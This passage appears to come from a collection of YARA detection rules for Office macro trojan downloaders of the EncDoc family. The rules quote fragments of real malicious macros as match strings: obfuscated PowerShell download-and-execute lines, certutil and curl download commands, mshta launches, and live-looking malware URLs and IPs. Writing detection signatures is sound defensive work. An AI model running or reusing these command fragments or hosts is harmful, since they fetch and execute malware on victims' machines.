        threat_id = "2147754187"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://www.cutedigitalphotography.com/cuteph/photosma.php" ascii //weight: 1
        $x_1_2 = "C:\\bceod" ascii //weight: 1
        $x_1_3 = "\\ewfvs.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_BK_2147754187_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.BK!MTB"
        threat_id = "2147754187"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "IEX (new`-OB`jeCT('Net.WebClient'))" ascii //weight: 1
        $x_1_2 = ".'DoWnloAdsTrInG'('ht'+'tp://paste.ee/r/O1pw3')" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_BK_2147754187_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.BK!MTB"
        threat_id = "2147754187"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "DoWnloAdsTrInG'('https://screw-malwrhunterteams.com/scanme.txt')\"" ascii //weight: 1
        $x_1_2 = "IEX (new`-OB`jeCT('Net.WebClient'))" ascii //weight: 1
        $x_1_3 = "powershell -Command g" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_BK_2147754187_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.BK!MTB"
        threat_id = "2147754187"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "powershell -w hidden (New-Object Net.WebClient)" ascii //weight: 1
        $x_1_2 = ".DownloadFile('https://cryptopro.ga/File/apo.exe','C:\\PROGRAMDATA\\ayatage.exe');" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_BK_2147754187_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.BK!MTB"
        threat_id = "2147754187"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "DoWnloAdsTrInG'('https://screw-malwrhunterteams.com/scanme.txt')\"" ascii //weight: 1
        $x_1_2 = "DoWnloAdsTrInG'('http://skidware-malwrhunterteams.com/scanme.txt')" ascii //weight: 1
        $x_1_3 = "IEX (new`-OB`jeCT('Net.WebClient'))" ascii //weight: 1
        $x_1_4 = "powershell -Command g" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SC_2147754195_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SC!MTB"
        threat_id = "2147754195"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"htt\" & Q() & \"cdn.d\" & G() & \"dapp.c\" & DD() & \"achments/\"" ascii //weight: 1
        $x_1_2 = "Shell (\"cmd /c curl \" & O & SS() & \"/\" & WW() & \"/paymentt.exe\" & \" --output %APPDATA%\\paymentt.exe  && timeout 1 && start %APPDATA%\\paymentt.exe\")" ascii //weight: 1
        $x_1_3 = "AutoOpen Macro" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SD_2147754241_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SD!MTB"
        threat_id = "2147754241"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=chr((7*2)+(((10-4)*2)*2))&chr((((16/2)*2)+(4*5))*2)&mid(tramadol,i+1,2)i=i+2" ascii //weight: 1
        $x_1_2 = "subsubworkbook_open()involvediving(sheets(\"s6a4d\").range(\"h101\").value),diving(sheets(\"s6a4d\").range(\"e118\").value),diving(sheets(\"s6a4d\")" ascii //weight: 1
        $x_1_3 = "getobject(alice).createobject(intro).runcycling" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_P_2147754362_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.P!MTB"
        threat_id = "2147754362"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://binexeupload.ru/4547js" ascii //weight: 1
        $x_1_2 = "powershell msiexe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_P_2147754362_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.P!MTB"
        threat_id = "2147754362"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cmd /c certutil.exe -urlcache -split -f" ascii //weight: 1
        $x_1_2 = "\"http://18.159.59.253/cut/290091332850986.bat" ascii //weight: 1
        $x_1_3 = "Jzqtdeuhvochwysiejinllk.exe.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_S_2147754423_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.S!MTB"
        threat_id = "2147754423"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "c:\\programdata\\lzhykoo.exe" ascii //weight: 1
        $x_1_2 = "URLDownloadToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_J_2147754458_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.J!MTB"
        threat_id = "2147754458"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "C:\\rncwner\\CkuiQhTXx.dll" ascii //weight: 1
        $x_1_2 = "http://0b.htb/s.dll" ascii //weight: 1
        $x_1_3 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_4 = "CreateDirectoryA" ascii //weight: 1
        $x_1_5 = "ShellExecuteA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_L_2147754797_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.L!MTB"
        threat_id = "2147754797"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://divineleverage.org/de.php?de=2INFO" ascii //weight: 1
        $x_1_2 = "C:\\ProgramData\\1.reg" ascii //weight: 1
        $x_1_3 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_4 = "ShellExecuteA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SM_2147755540_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SM!MTB"
        threat_id = "2147755540"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ShellExecute \"mshta\", \"https://bitly.com/asdqwdwdsfvcxvccv\", \"\", \"\", 0" ascii //weight: 1
        $x_1_2 = "CreateObject(\"new:13709620-C279-11CE-A49E-444553540000\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SM_2147755540_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SM!MTB"
        threat_id = "2147755540"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "\"h\"&\"t\"&\"tp\"&\"s://sa\"&\"mtnpy.org/bveCGKTX/ghb.h\"&\"t\"&\"m\"&\"l\",\"" ascii //weight: 3
        $x_3_2 = "\"h\"&\"tt\"&\"ps://m\"&\"ass\"&\"ngo.org/dXKvyKV9v8c/ghb.h\"&\"t\"&\"m\"&\"l\",\"" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SM_2147755540_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SM!MTB"
        threat_id = "2147755540"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {70 64 61 73 31 20 3d 20 22 6d [0-5] 73 [0-5] 68 [0-5] 74 [0-5] 61 20 68 [0-32] 74}  //weight: 1, accuracy: Low
        $x_1_2 = "ko2 = \"tps://" ascii //weight: 1
        $x_1_3 = "ko23 = \"bitly.com/" ascii //weight: 1
        $x_1_4 = {6f 6b 33 20 3d 20 22 [0-170] 22}  //weight: 1, accuracy: Low
        $x_1_5 = "Yahoodi1111 = pdas1 + ko2 + ko23 + ok3" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SM_2147755540_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SM!MTB"
        threat_id = "2147755540"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "eval('}KK)KK\"KK1KK6KK1KK.KK2KK2KK2KK.KK9KK8KK1KK.KK5KK/KK/KK:KKpKKtKKtKKhKK\"KK(KKtKKcKKuKKdKKoKKrKKPKKlKKlKKaKKtKKsKKnKKIKK;KK2KK=KKlKKeKKvKKeKKLKKIKKUKK{KK)KK)KK\"KKrKKeKKlKKlKKaKKt" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SM_2147755540_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SM!MTB"
        threat_id = "2147755540"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"pow^ers\"" ascii //weight: 1
        $x_1_2 = "= \"he^ll\"" ascii //weight: 1
        $x_2_3 = {22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-21] 2e 63 6d 22 20 26 20 43 68 72 28 43 4c 6e 67 28 39 37 2e 35 29 20 2b 20 43 4c 6e 67 28 31 2e 36 29 29}  //weight: 2, accuracy: Low
        $x_2_4 = {26 20 22 20 2d 77 20 68 69 20 73 6c 65 65 5e 70 20 2d 53 65 20 33 31 3b 53 74 61 [0-2] 72 74 2d 42 69 74 73 54 72 61 6e 73 5e 66 65 72 20 2d 53 6f 75 72 63 65 20 68 74 74 60 70 [0-170] 2e 65 60 78 65 22 20 26 20 22 20 2d 44 65 73 74 69 6e 61 74 69 6f 6e 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-21] 2e 65 60 78 65 22 20 26 20 22 3b 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-21] 2e 65 60 78 65}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RA_2147756304_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RA!MTB"
        threat_id = "2147756304"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub auto_open()" ascii //weight: 1
        $x_1_2 = "Dim strMacro As String" ascii //weight: 1
        $x_1_3 = {53 68 65 65 74 73 28 31 29 2e 52 61 6e 67 65 28 22 45 35 38 30 22 29 2e 4e 61 6d 65 20 3d 20 22 41 75 74 6f 5f 6f 75 76 72 69 72 35 (30|2d|39) 22}  //weight: 1, accuracy: Low
        $x_1_4 = {73 74 72 4d 61 63 72 6f 20 3d 20 22 41 75 74 6f 5f 6f 75 76 72 69 72 35 (30|2d|39) 22}  //weight: 1, accuracy: Low
        $x_1_5 = "Run (strMacro)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RA_2147756304_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RA!MTB"
        threat_id = "2147756304"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = "Shell (Environ(\"Temp\") + \"\\yHYWC.bat\")" ascii //weight: 1
        $x_1_3 = {41 70 70 6c 69 63 61 74 69 6f 6e 2e 57 61 69 74 20 28 4e 6f 77 20 2b 20 54 69 6d 65 56 61 6c 75 65 28 22 30 3a 30 30 3a 02 00 22 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 52 75 6e 20 28 [0-7] 28 22 10 00}  //weight: 1, accuracy: Low
        $x_1_5 = {50 75 62 6c 69 63 20 53 75 62 20 57 6f 72 6b 62 6f 6f 6b 5f 4f 70 65 6e 28 29 0d 0a 20 20 20 [0-5] 0d 0a 45 6e 64 20 53 75 62 0d 0a 50 72 69 76 61 74 65 20 53 75 62 20 00 28 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RA_2147756304_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RA!MTB"
        threat_id = "2147756304"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Public Function FovNYIgtnN(ZeelHNmQnd As String, UghwHxs As String) As String" ascii //weight: 1
        $x_1_2 = "Set x0ZAdOywm = CreateObject(UghwHxs)" ascii //weight: 1
        $x_1_3 = "yxbsTpaGkJ = Array(ZeelHNmQnd)" ascii //weight: 1
        $x_1_4 = ".Pattern = \"B|Y|U|v|w|D|q|V|F|j|P|I|X|L|O|Q|G|M|N|K|H|z|Z\"" ascii //weight: 1
        $x_1_5 = "FovNYIgtnN = x0ZAdOywm.Replace(yxbsTpaGkJ(0), \"\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RA_2147756304_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RA!MTB"
        threat_id = "2147756304"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Environ(\"TEMP\") & \"\\bla.exe\"" ascii //weight: 1
        $x_1_2 = {67 69 74 68 75 62 2e 63 6f 6d 2f 74 63 6f 6e 71 75 65 72 6f 72 2f 62 6c 61 2f 72 61 77 2f 6d 61 73 74 65 72 2f 41 75 74 6f 72 75 6e 73 2e 65 78 65 22 2c 20 46 4e 61 6d 65 2c 20 30 2c 20 30 29 8f 00 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 28 30 2c 20 22 68 74 74 70 73 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_2_3 = "http://45.85.90.14/i88/Rmcpg.ex\" & Chr(101) & Chr(34) & \" -Destination \" & Chr(34) & \"C:\\Users\\Public\\Documents\\fastedge.ex\"" ascii //weight: 2
        $x_2_4 = ".ShellExecute \"mshta\", \"http://facextrade.com.br/google.txt\", \"\", \"open\", 1" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_1_*))) or
            ((1 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_EncDoc_ALE_2147756623_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ALE!MTB"
        threat_id = "2147756623"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "h\"&\"t\"&\"tp\"&\"s://e\"&\"qc-certificati\"&\"onser\"&\"vices.com/O1AqIWdkJrf/mo\"&\"onli.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_2 = "h\"&\"t\"&\"t\"&\"ps://fp\"&\"sa.org.in/sGd\"&\"HtdANeEJ/m\"&\"oonl.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_3 = "h\"&\"t\"&\"tp\"&\"s://fis\"&\"hbo\"&\"wlonline.fishbo\"&\"wli\"&\"nventory.com/34zeKMgtdm/m\"&\"on\"&\"li.h\"&\"t\"&\"ml" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_NET_2147757423_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.NET!MTB"
        threat_id = "2147757423"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "powershell.exe -Command IEX (New-Object('Net.WebClient')).'DoWnlo" ascii //weight: 1
        $x_1_2 = "dsTrInG'('ht'+'tp://brutecleaner.com/Sheet.ps1')" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_NEE_2147757580_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.NEE!MTB"
        threat_id = "2147757580"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "powershell.exe -Command IEX (New-Object('Net.WebClient')).'DoWnlo" ascii //weight: 1
        $x_1_2 = "dsTrInG" ascii //weight: 1
        $x_1_3 = "http://office-service-secs.com/blm.task" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_NEU_2147758044_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.NEU!MTB"
        threat_id = "2147758044"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "powershell.exe -Command IEX (New-Object('Net.WebClient')).'DoWnlo" ascii //weight: 1
        $x_1_2 = "http://office-services-sec.com/crimea.ps1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_NEV_2147758614_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.NEV!MTB"
        threat_id = "2147758614"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://transip.digital/1.exe" ascii //weight: 1
        $x_1_2 = "C:\\cafDKRv\\IIXbeVu\\QkpxnTb.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RS_2147758749_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RS!MTB"
        threat_id = "2147758749"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {71 78 63 62 2e 6e 65 74 2f 64 73 2f 31 36 31 31 32 30 2e 67 69 66 3f 00 68 74 74 70 73 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_2 = "IICCCCI" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RF_2147758808_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RF!MTB"
        threat_id = "2147758808"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "powershell.exe -Command IEX (New-Object('Net.WebClient'))" ascii //weight: 1
        $x_1_2 = "'DoWnloAdsTrInG'('ht'+'tp://bluechipservicesinternational.org/d')" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PLG_2147758828_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PLG!MTB"
        threat_id = "2147758828"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "edd = b: ruo = 8: Run ((((((\"\" & \"D\" & 4))))))" ascii //weight: 1
        $x_1_2 = "hl_len(\"\" & I_restA(Split(m_train(m_train(Cells(145, 3)))))(1), \"\" & jo, \"/\")" ascii //weight: 1
        $x_1_3 = "hl_len(\"\" & a, \"A\", \".\")" ascii //weight: 1
        $x_1_4 = "For i = UBound(BnO) To LBound(BnO) Step -1" ascii //weight: 1
        $x_1_5 = {67 6e 20 3d 20 53 70 6c 69 74 28 22 22 20 26 20 6d 5f 74 72 61 69 6e 28 6d 5f 74 72 61 69 6e 28 43 65 6c 6c 73 28 31 33 31 2c 20 32 29 29 29 2c 20 22 ?? 22 29}  //weight: 1, accuracy: Low
        $x_1_6 = "= be_now(\"=\" & hl_len(\"\" & cf, \"AA\", vi_heiht)): nn_top (0.7)" ascii //weight: 1
        $x_1_7 = {46 75 6e 63 74 69 6f 6e 20 62 65 5f 6e 6f 77 28 56 20 41 73 20 53 74 72 69 6e 67 29 02 00 70 78 20 3d 20 36 3a 20 53 68 65 65 74 73 28 34 39 20 2d 20 31 20 2d 20 34 37 29 2e 5b 44 38 5d 2e 46 6f 72 6d 75 6c 61 20 3d 20 56 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
